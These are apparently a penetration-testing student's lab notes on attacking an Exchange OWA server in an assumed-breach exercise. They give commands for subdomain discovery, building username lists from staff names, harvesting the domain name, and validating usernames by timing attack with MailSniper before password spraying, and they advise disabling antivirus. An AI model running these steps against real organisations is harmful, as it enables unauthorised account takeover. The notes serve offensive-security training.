
We discovered the internal OWA Exchnage Server. We are in a assume breach scenario
```
~/dnscan$ ./dnscan.py -d cyberbotic.io -w subdomains-100.txt
[*] Processing domain cyberbotic.io
---SNIP---
172.67.205.143 - www.cyberbotic.io
104.21.90.222 - www.cyberbotic.io
10.10.15.100 - mail.cyberbotic.io
```

## Password Spraying
Patterns such as MonthYear (August2019), SeasonYear (Summer2019) and DayDate (Tuesday6) are very common.

> [!tip] 
>   Be cautious of localisations, e.g. Autumn vs Fall. 

Usernames could be extractet from various sources as seen in the external reconisance, mostly Linkedin or Websites. In this excercise the target has a "Our team" section: 

![[Pasted image 20230324090920.png]]

We can come up with this list:


```
Bob Farmer
Isabel Yates
John King
Joyce Adams
```

Use [namehash.py](https://gist.github.com/superkojiman/11076951) to create  alist of possible usernames based on the names of the people.

```
bobfarmer
farmerbob
bob.farmer
farmer.bob
farmerb
```

> [!hint] 
> We could potentially skip this step if we knew the email address format from somewhere like hunter.io 

Two excellent tools for password spraying against Office 365 and Exchange are [MailSniper](https://github.com/dafthack/MailSniper) and [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit). import MailSniper.ps1. (Disable AV first)

```
PS C:\Users\Attacker> ipmo C:\Tools\MailSniper\MailSniper.ps1
```


Enumerate the NetBIOS name of the target domain with `Invoke-DomainHarvestOWA`.

```
PS C:\Users\Attacker> Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io
```

Get the netbios name with:

```
Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io
```


`Invoke-UsernameHarvestOWA` uses a timing attack to validate which (if any) of these usernames are valid.
 
```
Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
```
 
 > [!OPSEC]
 > In the real world, be aware that these authentication attempts may count towards the domain lockout policy for the users.  Too many attempts in a short space of time are not only loud but may also lock accounts out.
>  
 
 

